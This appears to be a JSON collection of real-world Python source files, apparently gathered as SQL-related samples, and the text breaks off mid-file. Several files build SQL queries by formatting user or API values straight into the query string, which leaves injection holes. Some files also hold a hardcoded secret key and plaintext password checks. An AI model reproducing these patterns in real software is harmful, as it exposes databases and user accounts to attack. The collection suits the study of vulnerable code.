        "html_url": " https://github.com/bglazier/erpnext_ebay/blob/861c40698867fa45e579fca690c8c46a5cb1f7a2",
        "file_path": "/erpnext_ebay/ebay_active_listings.py",
        "source": "\"\"\"ebay active listings\nrun from: premium report, garagsale_xml\n\"\"\"\n\nfrom __future__ import unicode_literals\nfrom __future__ import print_function\nimport __builtin__ as builtins\n\n\nimport sys\nimport os.path\nimport datetime\nfrom datetime import date\nfrom types import MethodType\nimport string\n\nimport frappe\nfrom frappe import msgprint\n#from frappe.utils import cstr\n\nsys.path.insert(0, \"/Users/ben/dev/ebaysdk-python/dist/ebaysdk-2.1.5-py2.7.egg\")\nsys.path.insert(0, \"/usr/local/lib/python2.7/dist-packages/ebaysdk-2.1.4-py2.7.egg\")\nsys.path.insert(0, \"/usr/local/lib/python2.7/dist-packages/lxml-3.6.4-py2.7-linux-i686.egg\")\n\nfrom ebaysdk.exception import ConnectionError\nfrom ebaysdk.trading import Connection as Trading\nimport ugssettings\n\nsys.path.insert(0, frappe.get_app_path('unigreenscheme'))\nPATH_TO_YAML = os.path.join(\n    os.sep, frappe.utils.get_bench_path(), 'sites', frappe.get_site_path(), 'ebay.yaml')\n\n\n\ndef update_sold_statusDONOTUSE():\n    \n    sql = \"\"\"\n    DONT DO THIS UNLESS ABSOLUTELT SURE ABOUT QTY BETTER TO DO VIA IMPORT???????\n    update set it.workflow_state = 'Sold'\n\n    select it.item_code, bin.actual_qty\n    from `tabItem` it\n    right join `tabBin` bin\n    on bin.item_code = it.item_code\n\n    right join `zEbayListings` el\n    on el.sku = it.item_code\n    where el.qty =0 and bin.actual_qty =0\n    \"\"\"\n\n\n@frappe.whitelist()\ndef generate_active_ebay_data():\n    \"\"\"Get all the active eBay listings and save them to table\"\"\"\n\n    # set up the zEbayListings table\n    create_ebay_listings_table()\n\n    page = 1\n    listings_dict = get_myebay_selling_request(page)\n    pages = int(listings_dict['ActiveList']['PaginationResult']['TotalNumberOfPages'])\n    #timestamp = listings_dict['Timestamp']\n\n    while pages >= page:\n\n        for item in listings_dict['ActiveList']['ItemArray']['Item']:\n            ebay_id = item['ItemID']\n            qty = int(item['QuantityAvailable'])\n            try:\n                sku = item['SKU']\n            except:\n                sku = ''\n            #price = item['BuyItNowPrice']['value']\n            #THSI IS 0        print(item['BuyItNowPrice']['value'])\n            #Example: {'_currencyID': 'USD', 'value': '0.0'}   print(item['BuyItNowPrice'])\n            curr_ebay_price = float(item['SellingStatus']['CurrentPrice']['value'])\n            curr_ex_vat = curr_ebay_price / ugssettings.VAT\n            #currency = item['SellingStatus']['CurrentPrice']['_currencyID']  # or ['Currency']\n            #converted_price = item['ListingDetails]['ConvertedBuyItNowPrice']['value']\n            #description = item['Description']\n            hit_count = 0 #int(item['HitCount'])\n            watch_count = 0 #int(item['WatchCount'])\n            question_count = 0 # int(item['TotalQuestionCount'])\n            #title = item['Title']\n            #conv_title = title.encode('ascii', 'ignore').decode('ascii')\n            #new_title = MySQLdb.escape_string(conv_title)\n            site = ''\n            insert_ebay_listing(\n                sku, ebay_id, qty, curr_ebay_price, site, hit_count, watch_count, question_count)\n\n        page += 1\n        if pages >= page:\n            listings_dict = get_myebay_selling_request(page)\n        else:\n            break\n\n\n\n\ndef get_myebay_selling_request(page):\n    \"\"\"get_myebay_selling_request\"\"\"\n    try:\n        api_trading = Trading(config_file=PATH_TO_YAML, warnings=True, timeout=20)\n\n        api_request = {\n            \"ActiveList\":{\n                \"Include\": True,\n                \"Pagination\": {\n                    \"EntriesPerPage\": 100,\n                    \"PageNumber\": page\n                    },\n                \"IncludeWatchCount\": True\n            },\n            'DetailLevel': 'ReturnAll'\n        }\n\n        api_trading.execute('GetMyeBaySelling', api_request)\n        products = api_trading.response.dict()\n\n\n    except ConnectionError as e:\n        print(e)\n        print(e.response.dict())\n        raise e\n\n    return products\n\n\n\n\n\n\n\ndef create_ebay_listings_table():\n    \"\"\"Set up the zEbayListings temp table\"\"\"\n\n    sql = \"\"\"\n        create table if not exists `zEbayListings` (\n        `sku` varchar(20),\n        `ebay_id` varchar(38),\n        `qty` integer,\n        `price` decimal(18,6),\n        `site` varchar(6),\n        `hit_count` integer,\n        `watch_count` integer,\n        `question_count` integer\n        )\n    \"\"\"\n\n    frappe.db.sql(sql, auto_commit=True)\n\n    sql2 = \"\"\"truncate table `zEbayListings` \"\"\"\n\n    frappe.db.sql(sql2, auto_commit=True)\n\n\ndef insert_ebay_listing(sku, ebay_id, qty, price,\n                        site, hits, watches, questions):\n    \"\"\"insert ebay listings into a temp table\"\"\"\n\n    sql = \"\"\"\n    insert into `zEbayListings`\n    values('{sku}', '{ebay_id}', {qty}, {price}, '{site}', {hit_count}, {watch_count}, {question_count})\n    \"\"\".format(sku=sku, ebay_id=ebay_id, qty=qty, price=price, site=site,\n               hit_count=hits, watch_count=watches, question_count=questions)\n\n\n    frappe.db.sql(sql, auto_commit=True)\n\n\n\n\n\n\n\n##########  EBAY ID SYNCING CODE ############\n##########  EBAY ID SYNCING CODE ############\n##########  EBAY ID SYNCING CODE ############\n##########  EBAY ID SYNCING CODE ############\n##########  EBAY ID SYNCING CODE ############\n\n\n# if item is on ebay then set the ebay_id field\ndef set_item_ebay_id(item_code, ebay_id):\n    \"\"\"Given an item_code set the ebay_id field to the live eBay ID\n    also does not overwrite Awaiting Garagesale if ebay_id is blank\n    \"\"\"\n    if ebay_id == '':\n        sql = \"\"\"update `tabItem` it\n            set it.ebay_id = '{}'\n            where it.item_code = '{}' \n            and it.ebay_id <> '{}'\n            \"\"\".format(ebay_id, item_code, 'Awaiting Garagesale')\n    else:\n        sql = \"\"\"update `tabItem` it\n            set it.ebay_id = '{}'\n            where it.item_code = '{}' \n            \"\"\".format(ebay_id, item_code)\n\n    try:\n        frappe.db.sql(sql, auto_commit=True)\n\n\n    except Exception as inst:\n        print(\"Unexpected error running ebay_id sync.\", item_code)\n        raise\n\n    return True\n\n\n\n@frappe.whitelist()\ndef set_item_ebay_first_listed_date():\n    \"\"\"\n    Given an ebay_id set the first listed on date.\n    \n    select it.item_code from `tabItem` it\n    where it.on_sale_from_date is NULL\n    and it.ebay_id REGEXP '^[0-9]+$';\n    \"\"\"\n\n    date_today = date.today()\n\n    sql = \"\"\"\n    update `tabItem` it\n    set it.on_sale_from_date = '%s'\n    where it.on_sale_from_date is NULL\n    and it.ebay_id REGEXP '^[0-9]+$';\n    \"\"\"%date_today.isoformat()\n\n    try:\n        frappe.db.sql(sql, auto_commit=True)\n\n    except Exception as inst:\n        print(\"Unexpected error setting first listed date.\")\n        raise\n\n\ndef sync_ebay_ids():\n    \"\"\"Return only items that don't match\"\"\"\n\n    sql = \"\"\"\n    select * from (\n        SELECT t1.sku, t2.item_code, ifnull(t1.ebay_id, '') as live_ebay_id,\n        ifnull(t2.ebay_id, '') as dead_ebay_id FROM `zEbayListings` t1\n        LEFT JOIN `tabItem` t2 ON t1.sku = t2.item_code\n        UNION\n        SELECT t1.sku, t2.item_code, ifnull(t1.ebay_id, '') as live_ebay_id,\n        ifnull(t2.ebay_id, '') as dead_ebay_id FROM `zEbayListings` t1\n        RIGHT JOIN `tabItem` t2 ON t1.sku = t2.item_code\n    ) as t\n    where t.live_ebay_id <> t.dead_ebay_id\n    \"\"\"\n\n    records = frappe.db.sql(sql, as_dict=True)\n\n\n    for r in records:\n\n        # If not live id then clear any value on system (unless Awaiting Garagaesale)\n        if r.live_ebay_id == '':\n            set_item_ebay_id(r.item_code, '')\n        else:\n            # ok so item is live but id's don't match so update system with live version\n            if r.item_code:\n                set_item_ebay_id(r.sku, r.live_ebay_id)\n\n            else:\n                msgprint(\n                    'The ebay item cannot be found on ERPNEXT so unable to record ebay id', r.live_ebay_id)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/bentrab/music-reviewer-name-will-change/blob/39b6dc8fc012baf2dd1cc13f4fe74eacf0345b00",
        "file_path": "/run.py",
        "source": "import os\r\n\r\nimport configparser\r\nfrom flask_bcrypt import Bcrypt\r\nfrom flask import Flask, render_template, request, flash, session, redirect, url_for\r\nfrom forms import Last_FM_Form\r\nimport mysql.connector\r\n\r\n# Read configuration from file.\r\nconfig = configparser.ConfigParser()\r\nconfig.read('config.ini')\r\n\r\n# Set up application server.\r\napp = Flask(__name__)\r\nbcrypt = Bcrypt(app)\r\napp.secret_key = \"adbi327fds\"\r\n\r\n# Create a function for fetching data from the database.\r\ndef sql_query(sql):\r\n    db = mysql.connector.connect(**config['mysql.connector'])\r\n    cursor = db.cursor()\r\n    cursor.execute(sql)\r\n    result = cursor.fetchall()\r\n    cursor.close()\r\n    db.close()\r\n    return result\r\n\r\n\r\ndef sql_execute(sql):\r\n    db = mysql.connector.connect(**config['mysql.connector'])\r\n    cursor = db.cursor()\r\n    cursor.execute(sql)\r\n    db.commit()\r\n    cursor.close()\r\n    db.close()\r\n\r\n# For this example you can select a handler function by\r\n# uncommenting one of the @app.route decorators.\r\n\r\n#@app.route('/')\r\ndef basic_response():\r\n    return \"It works!\" #example\r\n\r\n# This route involves some LOGIN stuff, not implemented yet\t\r\n#@app.route('/login', methods = ['GET', 'POST'])\r\ndef login():\r\n   if request.method == 'POST':\r\n      session['username'] = request.form['username']\r\n      return redirect(url_for('index'))\r\n   #return render_template('login.html', )\r\n\r\n# route for account registartion\r\n@app.route(\"/register\", methods=[\"GET\", \"POST\"])\r\ndef register():\r\n    if 'user' in session:\r\n        return redirect(url_for('dashboard'))\r\n\r\n    message = None\r\n\r\n    if request.method == \"POST\":\r\n        try: \r\n            usern = request.form.get(\"username\")\r\n            passw = request.form.get(\"password\")\r\n            passw_hash = bcrypt.generate_password_hash(passw).decode('utf-8')\r\n\r\n            result = db.execute(\"INSERT INTO accounts (username, password) VALUES (:u, :p)\", {\"u\": usern, \"p\": passw_hash})\r\n            db.commit()\r\n\r\n            if result.rowcount > 0:\r\n                session['user'] = usern\r\n                return redirect(url_for('dashboard'))\r\n\r\n        except exc.IntegrityError:\r\n            message = \"Username already exists.\"\r\n            db.execute(\"ROLLBACK\")\r\n            db.commit()\r\n\r\n    return render_template(\"registration.html\", message=message)\r\n\r\n#route for logout\r\n@app.route(\"/logout\")\r\ndef logout():\r\n    session.pop('user', None)\r\n    return redirect(url_for('login'))\r\n   \r\n# Home page after login\r\n@app.route('/home/', methods=['GET', 'POST'])\t\r\n@app.route('/home/<username>', methods=['GET', 'POST'])\r\ndef home(username = None):\r\n\tlastFM = Last_FM_Form(request.form)\r\n\tif request.method == 'POST':\r\n\t\treturn lastFM_results(lastFM, username = username)\r\n\treturn render_template('home.html', username = username, form = lastFM)\r\n\r\n# Gets search results\t\r\n@app.route('/results')\r\ndef lastFM_results(lastFM, username):\r\n\tresults = []\r\n\tsearch_string = lastFM.data['search']\r\n\tif lastFM.data['search'] == '':\r\n\t\t#result = \r\n\t\t#results = result.all()\r\n\t\tresult = []\r\n\t\r\n\tif not results:\r\n\t\tflash('No results could be found for your search, please try again.')\r\n\t\treturn redirect('/home/%s' % username)\r\n\telse:\r\n\t\treturn render_template(lastFM_results.html, results = results)\r\n\r\n# Given code from teacher's example, not used yet\r\n#@app.route('/', methods=['GET', 'POST'])\r\ndef template_response_with_data():\r\n    print(request.form)\r\n    if \"buy-book\" in request.form:\r\n        book_id = int(request.form[\"buy-book\"])\r\n        sql = \"delete from book where id={book_id}\".format(book_id=book_id)\r\n        sql_execute(sql)\r\n    template_data = {}\r\n    sql = \"select id, title from book order by title\"\r\n    books = sql_query(sql)\r\n    template_data['books'] = books\r\n    return render_template('home-w-data.html', template_data=template_data)\r\n\r\nif __name__ == '__main__':\r\n    app.run(**config['app'])\r\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/p8ul/stackoverflow-lite/blob/dc307dd9bbacbbd916ce43d8ff92863465d88157",
        "file_path": "/app/__init__.py",
        "source": "# Flask create app\n\n# Author: P8ul\n# https://github.com/p8ul\n\nfrom flask import Flask\nfrom .migrations.db import db\n\n\ndef create_app(config_filename):\n    app = Flask(__name__)\n    app.config.from_object(config_filename)\n\n    with app.app_context():\n        pass\n\n    \"\"\" Basic Routes \"\"\"\n\n    # register our blueprints\n    configure_blueprints(app)\n\n    # register extensions\n    configure_extensions()\n\n    return app\n\n\ndef configure_blueprints(app):\n    \"\"\"Configure blueprints .\"\"\"\n    from app.questions.api.v1.view import question_blueprint\n    from .home.views import home_blueprint\n    from .auth.api.v1.view import auth_blueprint\n    from .answers.api.v1.view import answers_blueprint\n    from .votes.api.v1.view import votes_blueprint\n    from .comments.api.v1.view import comments_blueprint\n\n    app_blueprints = [\n        answers_blueprint,\n        question_blueprint,\n        auth_blueprint,\n        votes_blueprint,\n        comments_blueprint,\n        home_blueprint\n    ]\n\n    for bp in app_blueprints:\n        app.register_blueprint(bp)\n\n\ndef configure_extensions():\n    db.test()\n\n\nif __name__ == \"__main__\":\n    app = create_app(\"config\")\n    app.run(debug=True)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/p8ul/stackoverflow-lite/blob/dc307dd9bbacbbd916ce43d8ff92863465d88157",
        "file_path": "/app/answers/api/v1/view.py",
        "source": "# APIs Resources\n\n# Author: P8ul\n# https://github.com/p8ul\n\nfrom flask import Blueprint, request, make_response, jsonify\nfrom flask.views import MethodView\nfrom ...models import Table\nfrom ....utils import jwt_required\n\nanswers_blueprint = Blueprint('answers', __name__)\n\n\nclass CreateAPIView(MethodView):\n    \"\"\" Update Instance api resource \"\"\"\n\n    @jwt_required\n    def put(self, question_id=None, answer_id=None):\n        data = request.get_json(force=True)\n        response = Table.update(question_id, answer_id, data)\n        if response == 200:\n            response_object = {\n                'status': 'success',\n                'message': 'Update successful'\n            }\n            return make_response(jsonify(response_object)), 200\n        if response == 302:\n            response_object = {\n                'status': 'fail',\n                'message': 'Please provide correct answer and question id'\n            }\n            return make_response(jsonify(response_object)), 400\n        if response == 203:\n            response_object = {\n                'status': 'fail',\n                'message': 'Unauthorized request.'\n            }\n            return make_response(jsonify(response_object)), 401\n\n        else:\n            response_object = {\n                'status': 'fail',\n                'message': 'Please provide correct answer and question id'\n            }\n            return make_response(jsonify(response_object)), 400\n\n\n    \"\"\"\n    Create API Resource\n    \"\"\"\n    @jwt_required\n    def post(self, question_id=None):\n        # get the post data\n        post_data = request.get_json(force=True)\n        response = Table.save(str(question_id), data=post_data)\n        if response:\n            response_object = {\n                'status': 'success',\n                'message': response\n            }\n            return make_response(jsonify(response_object)), 201\n\n        response_object = {\n            'status': 'fail',\n            'message': 'Unknown question id. Try a different id.'\n        }\n        return make_response(jsonify(response_object)), 400\n\n\nclass ListAPIView(MethodView):\n    \"\"\"\n    List API Resource\n    \"\"\"\n    @jwt_required\n    def get(self, instance_id=None, user_id=None):\n        if instance_id:\n            query = {\n                'instance_id': instance_id,\n                'user_id': user_id\n            }\n            results = Table.filter_by(**query)\n            if len(results) < 1:\n                response_object = {\n                    'results': 'Instance not found',\n                    'status': 'error'\n                }\n                return make_response(jsonify(response_object)), 404\n            response_object = {\n                'results': results,\n                'status': 'success'\n            }\n            return (jsonify(response_object)), 200\n\n        response_object = {\n            'results': Table.query(),\n            'status': 'success'\n        }\n        return (jsonify(response_object)), 200\n\n\n# Define the API resources\ncreate_view = CreateAPIView.as_view('create_api')\nlist_view = ListAPIView.as_view('list_api')\n\n# Add Rules for API Endpoints\nanswers_blueprint.add_url_rule(\n    '/api/v1/questions/<int:question_id>/answers',\n    view_func=create_view,\n    methods=['POST']\n)\n\nanswers_blueprint.add_url_rule(\n    '/api/v1/questions/<string:question_id>/answers/<string:answer_id>',\n    view_func=create_view,\n    methods=['PUT']\n)\n\nanswers_blueprint.add_url_rule(\n    '/api/v1/questions/answers',\n    view_func=list_view,\n    methods=['GET']\n)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/p8ul/stackoverflow-lite/blob/dc307dd9bbacbbd916ce43d8ff92863465d88157",
        "file_path": "/app/answers/test/base.py",
        "source": "import unittest\n\nfrom ... import create_app\napp = create_app(\"config.TestConfig\")\n\n\nclass BaseTestCase(unittest.TestCase):\n    \"\"\"A base test case.\"\"\"\n    def create_app(self):\n        app.config.from_object('config.TestConfig')\n        return app\n\n    def setUp(self):\n        # method to invoke before each test.\n        self.client = app.test_client()\n        self.data = {\n            'username': 'Paul',\n            'email': 'pkinuthia10@gmail.com',\n            'password': 'password'\n        }\n        \"\"\" Login to get a JWT token \"\"\"\n        self.client.post('/api/v1/auth/signup', json=self.data)\n        response = self.client.post('/api/v1/auth/login', json=self.data)\n        self.token = response.get_json().get('auth_token')\n        self.user_id = str(response.get_json()['id'])\n\n    def tearDown(self):\n        # method to invoke after each test.\n        pass\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/p8ul/stackoverflow-lite/blob/dc307dd9bbacbbd916ce43d8ff92863465d88157",
        "file_path": "/app/answers/test/test_basics.py",
        "source": "# APIs Testing\n\n# Author: P8ul Kinuthia\n# https://github.com/p8ul\n\nimport unittest\nfrom .base import BaseTestCase\n\n\nclass FlaskTestCase(BaseTestCase):\n\n    \"\"\" Test List answers api \"\"\"\n    def test_list_answers(self):\n        response = self.client.get(\n            '/api/v1/questions/answers',\n            headers={'Authorization': 'JWT ' + self.token}\n        )\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(response.get_json()['status'], 'success')\n\n    \"\"\" Test answers CRUD api \"\"\"\n    def test_post_update(self):\n        \"\"\" Initialize test data \"\"\"\n        data = {\n            'title': 'Test title',\n            'body': 'Test body',\n            'answer_body': 'Test answer',\n            'user': self.user_id\n        }\n\n        \"\"\" Add test question\"\"\"\n        self.client.post(\n            '/api/v1/questions/', json=data,\n            headers={'Authorization': 'JWT ' + self.token}\n        )\n\n        response = self.client.get(\n            '/api/v1/questions/',\n            headers={'Authorization': 'JWT ' + self.token}\n        )\n        question_id = response.get_json().get('results')[0].get('question_id')\n\n        \"\"\" Test post answer \"\"\"\n        response = self.client.post(\n            '/api/v1/questions/'+str(question_id)+'/answers', json=data,\n            headers={'Authorization': 'JWT ' + self.token}\n        )\n\n        \"\"\" Test status \"\"\"\n        self.assertEqual(response.status_code, 201)\n\n        \"\"\" Test if a question is created \"\"\"\n        self.assertEqual(response.get_json()['status'], 'success')\n\n\nif __name__ == '__main__':\n    unittest.main()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/p8ul/stackoverflow-lite/blob/dc307dd9bbacbbd916ce43d8ff92863465d88157",
        "file_path": "/app/auth/api/v1/view.py",
        "source": "from flask import Blueprint, request, make_response, jsonify\nfrom flask.views import MethodView\nfrom ...models import Table\nfrom ....utils import jwt_required, encode_auth_token\n\nauth_blueprint = Blueprint('auth', __name__)\n\n\nclass RegisterAPI(MethodView):\n    \"\"\"\n    User Signup API Resource\n    \"\"\"\n\n    def post(self):\n        # get the post data\n        post_data = request.get_json(force=True)\n        # check if user already exists\n        user = Table.filter_by(post_data.get('email'))\n        if not user:\n            try:\n                user = Table.save(data=post_data)\n                # generate the auth token\n                auth_token = encode_auth_token(user.get('id')).decode()\n                response_object = {\n                    'status': 'success',\n                    'message': 'Successfully registered.',\n                    'id': user.get('id'),\n                    'auth_token': auth_token\n                }\n                return make_response(jsonify(response_object)), 201\n            except Exception as e:\n                print(e)\n                response_object = {\n                    'status': 'fail',\n                    'message': 'Some error occurred. Please try again.'\n                }\n                return make_response(jsonify(response_object)), 401\n        else:\n            response_object = {\n                'status': 'fail',\n                'message': 'User already exists. Please Log in.',\n            }\n            return make_response(jsonify(response_object)), 202\n\n    def delete(self, user_id=None):\n        post_data = request.get_json(force=True)\n        Table.delete(user_id, post_data)\n        response_object = {\n            'status': 'success',\n            'message': 'User deleted successfully.',\n        }\n        return make_response(jsonify(response_object)), 200\n\n\nclass LoginAPI(MethodView):\n    \"\"\" User Login API Resource \"\"\"\n    def post(self):\n        # get the post data\n        post_data = request.get_json(force=True)\n        try:\n            # fetch the user data\n            user = Table.filter_by(email=post_data.get('email'))\n            if len(user) >= 1 and post_data.get('password'):\n                if str(user[0][3]) == str(post_data.get('password')):\n                    auth_token = encode_auth_token(user[0][0])\n                else:\n                    response_object = {\n                        'status': 'fail',\n                        'message': 'Password or email do not match.'\n                    }\n                    return make_response(jsonify(response_object)), 401\n                try:\n                    if auth_token:\n                        response_object = {\n                            'status': 'success',\n                            'id': user[0][0],\n                            'message': 'Successfully logged in.',\n                            'auth_token': auth_token.decode()\n                        }\n                        return make_response(jsonify(response_object)), 200\n                except Exception as e:\n                    print(e)\n                    return {\"message\": 'Error decoding token'}, 401\n            else:\n                response_object = {\n                    'status': 'fail',\n                    'message': 'User does not exist.'\n                }\n                return make_response(jsonify(response_object)), 404\n        except Exception as e:\n            print(e)\n            response_object = {\n                'status': 'fail',\n                'message': 'Try again'\n            }\n            return make_response(jsonify(response_object)), 500\n\n\nclass UserListAPI(MethodView):\n    \"\"\" User List Api Resource \"\"\"\n    @jwt_required\n    def get(self, user_id=None):\n        if user_id:\n            user = Table.filter_by(email=None, user_id=user_id)\n            if len(user) < 1:\n                response_object = {\n                    'results': 'User not found',\n                    'status': 'fail'\n                }\n                return make_response(jsonify(response_object)), 404\n            response_object = {\n                'results': user,\n                'status': 'success'\n            }\n            return (jsonify(response_object)), 200\n\n        response_object = {\n            'results': Table.query(),\n            'status': 'success'\n        }\n        return (jsonify(response_object)), 200\n\n\nclass LogoutAPI(MethodView):\n    \"\"\" Logout Resource \"\"\"\n    def post(self):\n        # get auth token\n        auth_header = request.headers.get('Authorization')\n        return auth_header\n\n\n# Define the API resources\nregistration_view = RegisterAPI.as_view('register_api')\nlogin_view = LoginAPI.as_view('login_api')\nuser_view = UserListAPI.as_view('user_api')\nlogout_view = LogoutAPI.as_view('logout_api')\n\n# Add Rules for API Endpoints\nauth_blueprint.add_url_rule(\n    '/api/v1/auth/signup',\n    view_func=registration_view,\n    methods=['POST']\n)\n\n# Add Rules for API Endpoints\nauth_blueprint.add_url_rule(\n    '/api/v1/auth/delete',\n    view_func=registration_view,\n    methods=['DELETE']\n)\nauth_blueprint.add_url_rule(\n    '/api/v1/auth/login',\n    view_func=login_view,\n    methods=['POST']\n)\nauth_blueprint.add_url_rule(\n    '/api/v1/auth/users',\n    view_func=user_view,\n    methods=['GET']\n)\nauth_blueprint.add_url_rule(\n    '/api/v1/auth/users/<string:user_id>',\n    view_func=user_view,\n    methods=['GET']\n)\nauth_blueprint.add_url_rule(\n    '/api/v1/auth/logout',\n    view_func=logout_view,\n    methods=['POST']\n)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/p8ul/stackoverflow-lite/blob/dc307dd9bbacbbd916ce43d8ff92863465d88157",
        "file_path": "/app/auth/test/test_model.py",
        "source": "from .base import BaseTestCase\nfrom ..models import Table\n\n\nclass FlaskTestCase(BaseTestCase):\n\n    \"\"\" Test signup api \"\"\"\n    def test_model_crud(self):\n        # Test Create\n        instance = Table.save(self.data)\n        assert instance == self.data\n\n        # Test query\n        isinstance(Table.query(), type([]))\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/p8ul/stackoverflow-lite/blob/dc307dd9bbacbbd916ce43d8ff92863465d88157",
        "file_path": "/app/comments/api/v1/view.py",
        "source": "from flask import Blueprint, request, make_response, jsonify\nfrom flask.views import MethodView\nfrom ...models import Table\nfrom ....utils import jwt_required\n\ncomments_blueprint = Blueprint('comments', __name__)\n\n\nclass ListAPIView(MethodView):\n    \"\"\" Update Instance api resource \"\"\"\n\n    @jwt_required\n    def post(self, answer_id=None):\n        post_data = request.get_json(force=True)\n        response = Table.save(answer_id, data=post_data)\n        if response:\n            response_object = {\n                'status': 'success',\n                'message': 'Your comment was successful'\n            }\n            return make_response(jsonify(response_object)), 201\n\n        response_object = {\n            'status': 'fail',\n            'message': 'Some error occurred. Please try again.'\n        }\n        return make_response(jsonify(response_object)), 400\n\n\n# Define the API resources\ncomment_view = ListAPIView.as_view('comment_api')\n\n# Add Rules for API Endpoints\ncomments_blueprint.add_url_rule(\n    '/api/v1/questions/answers/comment/<string:answer_id>',\n    view_func=comment_view,\n    methods=['POST']\n)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/p8ul/stackoverflow-lite/blob/dc307dd9bbacbbd916ce43d8ff92863465d88157",
        "file_path": "/app/migrations/db.py",
        "source": "import psycopg2\nimport psycopg2.extras\n\nfrom .initial1 import migrations\nfrom config import BaseConfig\nfrom ..utils import db_config\n\n\nclass Database:\n    def __init__(self, config):\n        self.config = db_config(config)\n        self.database = self.config.get('database')\n\n    def test(self):\n        con = psycopg2.connect(**self.config)\n        con.autocommit = True\n\n        cur = con.cursor(cursor_factory=psycopg2.extras.DictCursor)\n        cur.execute(\"select * from pg_database where datname = %(database_name)s\", {'database_name': self.database})\n        databases = cur.fetchall()\n        if len(databases) > 0:\n            print(\" * Database {} exists\".format(self.database))\n            for command in migrations:\n                try:\n                    cur.execute(command)\n                    con.commit()\n                except Exception as e:\n                    print(e)\n        else:\n            print(\" * Database {} does not exists\".format(self.database))\n        con.close()\n\n\ndb = Database(BaseConfig.SQLALCHEMY_DATABASE_URI)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Impactstory/oadoi/blob/bd63cb3840cc08cc1846b1baf121bea0a84af079",
        "file_path": "/search.py",
        "source": "from sqlalchemy import sql\n\nfrom app import db\nfrom pub import Pub\n\ndef fulltext_search_title(query):\n    query_string = \"\"\"\n      SELECT id, ts_headline('english', title, query), ts_rank_cd(to_tsvector('english', title), query, 32) AS rank\n        FROM pub_2018, plainto_tsquery('english', '{}') query  -- or try plainto_tsquery, phraseto_tsquery, to_tsquery\n        WHERE to_tsvector('english', title) @@ query\n        ORDER BY rank DESC\n        LIMIT 50;\"\"\".format(query)\n\n    rows = db.engine.execute(sql.text(query_string)).fetchall()\n    ids = [row[0] for row in rows]\n    my_pubs = db.session.query(Pub).filter(Pub.id.in_(ids)).all()\n    for row in rows:\n        my_id = row[0]\n        for my_pub in my_pubs:\n            if my_id == my_pub.id:\n                my_pub.snippet = row[1]\n                my_pub.score = row[2]\n    return my_pubs\n\ndef autocomplete_phrases(query):\n    query_string = ur\"\"\"\n        with s as (SELECT id, lower(title) as lower_title FROM pub_2018 WHERE title iLIKE '%{query}%')\n        select match, count(*) as score from (\n            SELECT regexp_matches(lower_title, '({query}\\w*?\\M)', 'g') as match FROM s\n            union all\n            SELECT regexp_matches(lower_title, '({query}\\w*?(?:\\s+\\w+){{1}})\\M', 'g') as match FROM s\n            union all\n            SELECT regexp_matches(lower_title, '({query}\\w*?(?:\\s+\\w+){{2}})\\M', 'g') as match FROM s\n            union all\n            SELECT regexp_matches(lower_title, '({query}\\w*?(?:\\s+\\w+){{3}}|)\\M', 'g') as match FROM s\n        ) s_all\n        group by match\n        order by score desc, length(match::text) asc\n        LIMIT 50;\"\"\".format(query=query)\n\n    rows = db.engine.execute(sql.text(query_string)).fetchall()\n    phrases = [{\"phrase\":row[0][0], \"score\":row[1]} for row in rows if row[0][0]]\n    return phrases",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/adambaumeister/goflow-ui/blob/cdbbb117ec7423a2f55fe3f54530f6caeb4fe592",
        "file_path": "/gfui/backends/Timescaledb/timescaledb.py",
        "source": "from gfui.backends.default import Backend\nimport psycopg2\nfrom gfui.chartgraph import Graph, Table\nimport re\nimport ipaddress\nimport os\n\nclass Timescaledb_backend(Backend):\n    def __init__(self, OPTIONS):\n        super().__init__()\n        self.required_opts = ['SQL_SERVER', 'SQL_USERNAME', 'SQL_DB']\n        self.parse_options(OPTIONS)\n        self.columns = {}\n\n        pw = os.environ.get(\"SQL_PASSWORD\")\n        if not pw:\n            pw = self.OPTIONS['SQL_PASSWORD']\n\n        self.db = psycopg2.connect(\n            \"dbname={0} user={1} password={2} host={3}\".format(\n                self.OPTIONS['SQL_DB'],\n                self.OPTIONS['SQL_USERNAME'],\n                pw,\n                self.OPTIONS['SQL_SERVER']\n            )\n        )\n\n        self.schema = Schema()\n\n        self.filters = []\n\n    def get_columns(self):\n        return self.schema.get_columns()\n\n    def add_filter(self, op, value):\n        self.schema.add_filter(value, op)\n\n    def get_int_columns(self):\n        return self.schema.get_int_columns()\n\n    def flow_table(self, limit=10):\n        db = self.db\n        self.schema.limit = limit\n        FLOWS = self.schema.flows()\n\n        cursor = db.cursor()\n        cursor.execute(FLOWS)\n        r = cursor.fetchall()\n        t = Table()\n        t = t.table_from_rows(r, self.schema.column_order)\n        return t\n\n    def topn_sum_graph(self, field, sum_by, limit=10):\n        db = self.db\n        self.schema.limit = limit\n        FLOWS_PER_IP = self.schema.topn_sum(field, sum_by)\n\n        cursor = db.cursor()\n        cursor.execute(FLOWS_PER_IP)\n        r = cursor.fetchall()\n        g = Graph()\n        g.name = \"TopN {0}\".format(field)\n        g.set_headers([\n            field,\n            \"Total\"\n        ])\n        g.graph_from_rows(r, 0)\n        return g\n\nclass Column:\n    \"\"\"\n    Column\n\n    Column handling class.\n    Governs how query strings are built and helper functons for returned data.\n    \"\"\"\n    def __init__(self, name, display_name=None):\n        self.name = name\n        self.display_name = display_name\n        self.type = 'text'\n        self.filter_string = None\n\n    def get_display_name(self):\n        return self.display_name\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        if self.filter_string:\n            self.filter_string = self.filter_string + \"AND {2} {0} \\\"{1}\\\"\".format(op, value, self.name)\n        else:\n            self.filter_string = \"{2} {0} \\\"{1}\\\"\".format(op, value, self.name)\n\nclass IP4Column(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = \"ip\"\n\n    def select(self):\n        return 